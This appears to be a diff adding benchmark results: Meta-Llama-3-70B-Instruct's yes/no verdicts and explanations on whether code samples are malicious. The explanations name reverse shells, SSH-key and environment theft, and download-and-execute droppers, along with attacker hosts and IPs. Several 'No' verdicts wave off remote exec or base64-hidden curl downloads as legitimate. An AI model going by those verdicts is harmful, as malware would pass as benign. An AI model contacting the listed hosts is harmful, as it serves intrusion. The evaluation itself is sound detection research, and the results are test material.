+            "output": "Yes\n\nThe code is malicious because it establishes a reverse shell connection to a remote server at the beginning, allowing an attacker to remotely access and control the system. The connection is made using a socket, and the `pty.spawn('/bin/bash')` line spawns a new Bash shell, giving the attacker a command-line interface to the system. This is a common technique used in malware and backdoors. The rest of the code appears to be unrelated to this malicious activity and may be an attempt to disguise the true purpose of the code."
+        }
+    },
+    "318": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it establishes a reverse shell connection to a remote server at 'as6fte0lgycesa9xohgt2mi6wx2oqhe6.oastify.com' on port 2333, which allows an attacker to remotely access and control the system. This is a clear indication of a backdoor or remote access trojan (RAT) behavior."
+        }
+    },
+    "319": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code provided is not malicious. It appears to be a legitimate script that interacts with Azure DevOps, Discord, and OpenWeatherMap APIs. The script uses various libraries and modules to perform tasks such as querying work items, sending requests, and handling errors. The code also includes functions for debugging and taking manual user input. While it does use the `exec` function to execute code from a Pastebin URL, this is likely for legitimate purposes such as updating the script or executing a specific task. However, it's worth noting that using `exec` with untrusted input can be a security risk, and it's recommended to avoid using it whenever possible."
+        }
+    },
+    "320": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a suspicious section that downloads and executes a script from a remote URL. This is a common technique used by malware to download and execute malicious payloads. The code uses the `urllib.request` module to download the script, and then uses the `exec` function to execute it. This is a major security risk, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "321": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate script for interacting with Azure DevOps and Discord, as well as making API calls to OpenWeatherMap and ipinfo.io. It does not contain any obvious malicious code, such as attempts to steal sensitive information, execute system commands, or download malware. The script's primary functions seem to be related to querying Azure DevOps for work items, sending OS information to a Discord webhook, and making weather API calls."
+        }
+    },
+    "322": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code appears to be malicious due to several suspicious activities:\n\n1. It steals environment variables and sends them to a remote server.\n2. It steals SSH private keys and sends them to a remote server.\n3. It uses the `subprocess` module to execute system commands, which can be a security risk if not used carefully.\n4. It sends data to a hardcoded URL, which could be a command and control (C2) server.\n5. It uses base64 encoding to encode the stolen data, which is a common technique used by malware to hide its communication.\n\nThese activities are indicative of a malicious program that is designed to steal sensitive information and send it to a remote attacker."
+        }
+    },
+    "323": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code appears to be a malicious bot that collects sensitive information about the device it's running on, such as the IP address, city, region, country, device model, and operating system. It then sends this information to a Telegram bot, which could be used for malicious purposes. Additionally, the code imports modules from Azure DevOps and OpenWeatherMap, which could be used to access sensitive information or perform unauthorized actions. The presence of a `dbg` function that prints debug information and the use of ANSI escape codes for coloring the output also suggests that the code is intended for malicious use."
+        }
+    },
+    "324": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe reason for this decision is that the code appears to be a legitimate Azure DevOps and OpenWeatherMap API client implementation. It does not contain any obvious malicious behavior such as unauthorized data access, code execution, or network communication. The code is primarily focused on interacting with Azure DevOps and OpenWeatherMap APIs to retrieve work items and weather data. The suspicious-looking URL in the first `requests.get` call is likely a tracking or analytics endpoint, but without more context, it's difficult to say for certain. However, the overall structure and functionality of the code suggest a legitimate purpose rather than malicious intent."
+        }
+    },
+    "325": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it appears to be a spyware/malware that steals sensitive information from the user's system and sends it to a remote server. \n\nHere are some reasons why:\n\n1. It searches for `.env` files on the system, which often contain sensitive environment variables, and sends their contents to a remote server.\n\n2. It collects the user's environment variables and sends them to a remote server.\n\n3. It tries to read the user's SSH private key and sends it to a remote server.\n\n4. It makes requests to external APIs, including OpenWeatherMap and ipinfo.io, which could be used to gather more information about the user.\n\n5. The code is obfuscated and tries to hide its intentions by using base64 encoding and making requests to a hardcoded URL.\n\n6. The code also appears to be interacting with Azure DevOps, which could be used to exfiltrate data or gain unauthorized access to the user's Azure account.\n\nOverall, this code has all the hallmarks of a malicious spyware/malware and should be treated with extreme caution."
+        }
+    },
+    "326": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it sends system information, including uptime and IP details, to a remote server ('64.23.142.76', 9090) without the user's knowledge or consent. This is a clear indication of a backdoor or a remote access trojan (RAT)."
+        }
+    },
+    "327": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code includes a curl command that sends sensitive system information, including the hostname, current user, current directory, and a directory listing, to an external URL. This could be a potential security risk as it exposes internal system information to an unknown external entity."
+        }
+    },
+    "328": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote location and executes it, which is a clear indication of malicious behavior. The downloaded file is saved to the user's AppData directory and then executed using the subprocess module. This could potentially lead to the execution of malicious code on the user's system."
+        }
+    },
+    "329": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads and executes a shell script from an unknown URL (`https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh`) without any validation or verification, which is a clear security risk. This script could contain malicious code, and the `os.system` call with elevated privileges (`os.chmod(script_path, 493)`) allows it to perform arbitrary system modifications."
+        }
+    },
+    "330": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate Azure DevOps work item tracking service with additional functionality for weather and IP information retrieval. The `notmalfunc` function seems suspicious at first, but it's actually a base64-encoded command that, when decoded, appears to be a curl command to download a batch file from a specific URL. However, without more context, it's difficult to determine the intent behind this function. \n\nThe rest of the code is focused on interacting with Azure DevOps, retrieving weather information, and displaying debug information. There are no obvious signs of malicious activity, such as data exfiltration, unauthorized access, or malicious system calls."
+        }
+    },
+    "331": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThis code appears to be a legitimate script for interacting with Azure DevOps, Discord, and OpenWeatherMap APIs. It does not contain any obvious malicious behavior such as data theft, unauthorized access, or malicious code execution. The code is primarily focused on retrieving data from various APIs and performing tasks related to work item tracking and weather information."
+        }
+    },
+    "332": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate script that collects system information, sends analytics to a webhook, and interacts with Azure DevOps and OpenWeatherMap APIs. Although it does send data to an external server, it does not seem to be malicious in nature. The data being sent is related to system information and analytics, which is a common practice in many applications. There is no evidence of code injection, malicious file access, or other common malicious activities."
+        }
+    },
+    "333": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server using the `socket` and `subprocess` modules, which is a common technique used by malware to gain unauthorized access to a system. The connection is made to a specific host and port, and the `os.dup2` calls are used to redirect the standard input, output, and error streams to the socket, allowing the remote server to interact with the system as if it were a local terminal. This is a strong indication of malicious intent."
+        }
+    },
+    "334": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code creates a new Python file named'remote-access.py' in the user's documents directory, writes malicious code to it, and then executes it. The malicious code creates a new process that runs'main.exe' with elevated privileges. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine with elevated privileges."
+        }
+    },
+    "335": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking script with some additional features such as opening a YouTube video, executing an external executable, and displaying colored text. It also includes a weather API key and IP info URL, but these are not being used maliciously. The code does not contain any obvious malicious activities such as data theft, unauthorized access, or system compromise."
+        }
+    },
+    "336": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it appears to be a data exfiltration tool. It collects logs from the system, archives them, and then sends them to a Telegram bot using the `requests` library. The bot token and chat ID are not provided in the code, but they would typically be hardcoded or obtained from an environment variable. This suggests that the code is designed to secretly collect and transmit sensitive data from the system to a remote location."
+        }
+    },
+    "337": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code executes a bash command that downloads and runs a script from an unknown GitHub repository, which could potentially be malicious. The script is downloaded and executed with elevated privileges (due to the `chmod +x` command), allowing it to perform any action on the system. This is a significant security risk, as it could lead to the execution of arbitrary code, data theft, or system compromise."
+        }
+    },
+    "338": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate Azure DevOps and OpenWeatherMap API client. It uses the `os` module to execute some shell commands, but these commands are harmless and seem to be used for creating a directory and downloading a file. The code also uses the `curl` command to download a file from a URL, but the URL appears to be a legitimate one.\n\nThe code also defines a `WorkItemService` class that interacts with the Azure DevOps API to retrieve work items, and it uses the OpenWeatherMap API to retrieve weather data.\n\nThere are no obvious signs of malicious activity, such as attempting to steal sensitive data, execute arbitrary code, or communicate with a malicious server. The code appears to be a legitimate implementation of a DevOps and weather API client."
+        }
+    },
+    "339": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason I made this decision is that the code is sending environment variables, uname, and IP address to a Slack webhook URL, which could be a potential security risk. This could be a form of data exfiltration or unauthorized data collection. Additionally, the code is using a hard-coded Slack webhook URL, which could be a security risk if the URL is not properly secured."
+        }
+    },
+    "340": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a reverse shell that connects to a remote server (LHOST, LPORT) and spawns a shell, allowing an attacker to remotely access and control the system. This is a clear indication of malicious intent."
+        }
+    },
+    "341": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Dropbox URL and then runs it using the subprocess module. This is a potential security risk as it could be used to download and execute malicious code."
+        }
+    },
+    "342": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code downloads and executes arbitrary Python code from a remote location, which is a classic sign of malicious behavior. The `TELEMETRY_INFO` variable contains a base64-encoded URL that is decoded and used to download a Python script, which is then executed using the `subprocess` module. This allows an attacker to execute arbitrary code on the system, potentially leading to a complete compromise of the system."
+        }
+    },
+    "343": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThis code is malicious because it downloads and executes an executable file from a remote server, which is a clear indication of malware behavior. The executable file is downloaded from the URL \"https://filego.app/api/dl/file/taa91xnm/0\" and saved to the user's temporary directory. Then, it is executed using the subprocess module, which allows the attacker to run arbitrary code on the victim's machine. This is a common technique used by malware to infect systems."
+        }
+    },
+    "344": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it gathers information about the user's system, including the username, operating system, IP address, country, region, city, and directory listing, and sends this information to a Discord webhook URL. This is a clear indication of data exfiltration and unauthorized collection of sensitive information."
+        }
+    },
+    "345": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is making a POST request to a URL with sensitive information such as the hostname, current user, current working directory, and a list of files in the current directory. This could be a potential information leak or even a backdoor for an attacker to gather information about the system."
+        }
+    },
+    "346": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking script with analytics and debugging functionality. It does not contain any malicious code such as data theft, unauthorized access, or system compromise. The analytics function sends data to a webhook, but it's likely for legitimate tracking purposes. The code also includes functionality for querying Azure DevOps work items and interacting with the OpenWeatherMap API."
+        }
+    },
+    "347": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThis code appears to be a legitimate script for interacting with Azure DevOps and OpenWeatherMap APIs. It does not contain any obvious malicious behavior such as unauthorized access, data exfiltration, or malicious system modifications. The code is primarily focused on querying work items from Azure DevOps and retrieving weather data from OpenWeatherMap. The use of subprocess to execute a curl command is suspicious, but in this context, it appears to be used to send data to a specific URL, which may be a legitimate endpoint for data collection or analytics."
+        }
+    },
+    "348": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a URL and runs it using the `subprocess` module. This is a potential security risk as it allows an attacker to execute arbitrary code on the system. The `updateData` function downloads a file named `helper.exe` from a provided URL and runs it, which could lead to the execution of malicious code."
+        }
+    },
+    "349": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code establishes a reverse shell connection to a remote server at `lhost = '3.228.3.164'` and `lport = 80`. This is a common technique used by malware to establish a backdoor connection to a command and control server, allowing an attacker to remotely access and control the infected system. The code also attempts to gather process information and spawn a bash shell, which could be used to execute arbitrary commands on the system."
+        }
+    }
+}
